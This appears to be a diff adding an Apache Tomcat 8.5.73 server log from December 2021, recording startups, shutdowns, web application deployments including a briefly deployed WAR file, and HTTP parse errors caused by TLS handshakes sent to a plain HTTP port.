+09-Dec-2021 02:33:07.409 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+09-Dec-2021 02:33:07.571 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:33:07.600 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+09-Dec-2021 02:33:07.631 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1262 ms
+09-Dec-2021 02:33:07.699 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+09-Dec-2021 02:33:07.700 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+09-Dec-2021 02:33:07.723 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+09-Dec-2021 02:33:08.226 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [502] ms
+09-Dec-2021 02:33:08.227 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+09-Dec-2021 02:33:08.269 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [42] ms
+09-Dec-2021 02:33:08.269 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+09-Dec-2021 02:33:08.705 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [436] ms
+09-Dec-2021 02:33:08.705 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+09-Dec-2021 02:33:08.748 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [43] ms
+09-Dec-2021 02:33:08.748 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+09-Dec-2021 02:33:08.799 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [51] ms
+09-Dec-2021 02:33:08.813 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:33:08.825 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1194 ms
+09-Dec-2021 02:51:58.954 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.users.MemoryUserDatabase.backgroundProcess Reloading memory user database [UserDatabase] from updated source [file:/opt/tomcat/apache-tomcat-8.5.73/conf/tomcat-users.xml]
+09-Dec-2021 02:57:14.557 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+09-Dec-2021 02:57:14.557 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:57:14.561 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+09-Dec-2021 02:57:14.641 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:57:14.643 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:58:51.860 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+09-Dec-2021 02:58:51.863 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+09-Dec-2021 02:58:51.863 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+09-Dec-2021 02:58:51.864 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+09-Dec-2021 02:58:51.865 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1020-aws
+09-Dec-2021 02:58:51.865 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+09-Dec-2021 02:58:51.865 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+09-Dec-2021 02:58:51.865 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_292-8u292-b10-0ubuntu1~20.04-b10
+09-Dec-2021 02:58:51.865 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+09-Dec-2021 02:58:51.866 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:58:51.866 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:58:51.867 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+09-Dec-2021 02:58:51.867 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+09-Dec-2021 02:58:51.867 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+09-Dec-2021 02:58:51.868 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+09-Dec-2021 02:58:51.868 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+09-Dec-2021 02:58:51.868 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+09-Dec-2021 02:58:51.872 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:58:51.874 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:58:51.874 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+09-Dec-2021 02:58:51.875 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+09-Dec-2021 02:58:52.041 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:58:52.069 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+09-Dec-2021 02:58:52.104 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1283 ms
+09-Dec-2021 02:58:52.174 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+09-Dec-2021 02:58:52.175 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+09-Dec-2021 02:58:52.200 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+09-Dec-2021 02:58:52.749 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [548] ms
+09-Dec-2021 02:58:52.750 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+09-Dec-2021 02:58:52.779 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [29] ms
+09-Dec-2021 02:58:52.785 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+09-Dec-2021 02:58:53.237 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [453] ms
+09-Dec-2021 02:58:53.238 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+09-Dec-2021 02:58:53.280 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [42] ms
+09-Dec-2021 02:58:53.281 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+09-Dec-2021 02:58:53.318 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [37] ms
+09-Dec-2021 02:58:53.320 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:58:53.337 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1233 ms
+09-Dec-2021 03:13:23.441 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.startup.HostConfig.undeploy Undeploying context [/host-manager]
+09-Dec-2021 03:13:23.461 INFO [localhost-startStop-2] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+09-Dec-2021 03:13:23.499 INFO [localhost-startStop-2] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [38] ms
+09-Dec-2021 03:15:08.284 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+09-Dec-2021 03:15:08.284 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 03:15:08.288 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+09-Dec-2021 03:15:08.330 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 03:15:08.332 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 03:15:43.650 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+09-Dec-2021 03:15:43.658 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+09-Dec-2021 03:15:43.659 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+09-Dec-2021 03:15:43.660 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+09-Dec-2021 03:15:43.660 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1020-aws
+09-Dec-2021 03:15:43.660 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+09-Dec-2021 03:15:43.660 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+09-Dec-2021 03:15:43.661 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_292-8u292-b10-0ubuntu1~20.04-b10
+09-Dec-2021 03:15:43.661 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+09-Dec-2021 03:15:43.661 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 03:15:43.661 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 03:15:43.662 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+09-Dec-2021 03:15:43.662 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+09-Dec-2021 03:15:43.662 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+09-Dec-2021 03:15:43.663 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+09-Dec-2021 03:15:43.663 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+09-Dec-2021 03:15:43.663 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+09-Dec-2021 03:15:43.664 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 03:15:43.666 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 03:15:43.666 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+09-Dec-2021 03:15:43.666 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+09-Dec-2021 03:15:43.835 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 03:15:43.866 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+09-Dec-2021 03:15:43.898 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1230 ms
+09-Dec-2021 03:15:43.970 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+09-Dec-2021 03:15:43.970 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+09-Dec-2021 03:15:43.996 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+09-Dec-2021 03:15:44.487 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [490] ms
+09-Dec-2021 03:15:44.492 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+09-Dec-2021 03:15:44.530 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [38] ms
+09-Dec-2021 03:15:44.536 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+09-Dec-2021 03:15:44.983 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [447] ms
+09-Dec-2021 03:15:44.988 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+09-Dec-2021 03:15:45.023 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [35] ms
+09-Dec-2021 03:15:45.029 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+09-Dec-2021 03:15:45.081 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [51] ms
+09-Dec-2021 03:15:45.087 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 03:15:45.108 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1203 ms
+10-Dec-2021 02:31:10.987 INFO [http-nio-8081-exec-10] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/opt/tomcat/apache-tomcat-8.5.73/webapps/k1unzyhd.war]
+10-Dec-2021 02:31:11.042 INFO [http-nio-8081-exec-10] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/opt/tomcat/apache-tomcat-8.5.73/webapps/k1unzyhd.war] has finished in [55] ms
+10-Dec-2021 02:31:21.054 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.startup.HostConfig.undeploy Undeploying context [/k1unzyhd]
+10-Dec-2021 14:23:10.025 INFO [http-nio-8081-exec-13] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xe30x010x000x000xdf0x030x03(0xb6\?0xef0xbc0xa80x99}|0x840xb50x050x940xde'0xbfT0x940x890xa50xa40xacB0xe80x140xc1Q0x8b0x060x87=0x000x00h0xcc0x140xcc0x130xc0/0xc0+0xc000xc0,0xc00x110xc00x070xc0'0xc0#0xc00x130xc00x090xc0(0xc0$0xc00x140xc00x0a0xcc0x150x000x9e0x000x9f0x00g0x00k0x0030x0090x000x9c0x000x9d0x000x050x000x040x00<0x00=0x00/0x0050xc00x120x000x160x000x0a0x000x030x000x080x000x060x000x140x000x110x000x190x000x170x0020xc00x080x000x120x000x130x000x150x0080x00@0x00f0x00j0x000xa20x000xa30x010x000x00N0x000x000x000x150x000x130x000x000x1052.60.59.64:80810x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0c0x000x0a0x040x010x040x030x020x010x020x030x020x020xff0x010x000x010x000x000x0f0x000x010x01...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+11-Dec-2021 18:06:30.933 INFO [http-nio-8081-exec-12] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xe30x010x000x000xdf0x030x030xf0H0xca0xa60x160xf20x7fz0xbb,0xe0M8Y0xbe0xc90x950xbc10x81X0xd70xa50xb690x9b70xbbV8y#0x000x00h0xcc0x140xcc0x130xc0/0xc0+0xc000xc0,0xc00x110xc00x070xc0'0xc0#0xc00x130xc00x090xc0(0xc0$0xc00x140xc00x0a0xcc0x150x000x9e0x000x9f0x00g0x00k0x0030x0090x000x9c0x000x9d0x000x050x000x040x00<0x00=0x00/0x0050xc00x120x000x160x000x0a0x000x030x000x080x000x060x000x140x000x110x000x190x000x170x0020xc00x080x000x120x000x130x000x150x0080x00@0x00f0x00j0x000xa20x000xa30x010x000x00N0x000x000x000x150x000x130x000x000x1052.60.59.64:80810x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0c0x000x0a0x040x010x040x030x020x010x020x030x020x020xff0x010x000x010x000x000x0f0x000x010x01...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+12-Dec-2021 08:41:35.390 INFO [http-nio-8081-exec-12] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x890x010x000x000x850x030x0320x1b0xcc4>0xe50xed~0x9c0xfe>T30xb2L0xc00xd90xe60x9e00xbc0xca0x84b0x870xdb0x06YRZ+0x160x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00B0x000x000x000x100x000x0e0x000x000x0b52.60.59.640x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+13-Dec-2021 11:24:40.520 INFO [http-nio-8081-exec-16] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xae0x010x000x000xaa0x030x030xb60xf70xa90xf30x110xf7k20xa80xed0x9adsk0xba_+0x8drZ0xf40xf00xce/R0x84{`0x9b0xd50xc40x0c0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00g3t0x000x000x000x000x000x100x000x0e0x000x000x0b52.60.59.640x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x100x000x0e0x040x010x040x030x020x010x020x030x040x010x050x010x060x010xff0x010x000x010x000x000x100x000x170x000x150x02h20x08http/1.10x08spdy/3.1...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+25-Dec-2021 15:24:42.695 INFO [Thread-4] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 15:24:44.482 INFO [Thread-4] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+25-Dec-2021 15:24:47.020 INFO [Thread-4] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 15:24:47.445 INFO [Thread-4] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+25-Dec-2021 15:52:39.547 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+25-Dec-2021 15:52:39.556 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+25-Dec-2021 15:52:39.557 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+25-Dec-2021 15:52:39.557 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+25-Dec-2021 15:52:39.560 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1022-aws
+25-Dec-2021 15:52:39.561 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+25-Dec-2021 15:52:39.561 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+25-Dec-2021 15:52:39.561 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-8u312-b07-0ubuntu1~20.04-b07
+25-Dec-2021 15:52:39.561 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+25-Dec-2021 15:52:39.561 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 15:52:39.561 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+25-Dec-2021 15:52:39.562 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+25-Dec-2021 15:52:39.572 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+25-Dec-2021 15:52:39.572 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+25-Dec-2021 15:52:39.573 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+25-Dec-2021 15:52:39.574 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+25-Dec-2021 15:52:39.574 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
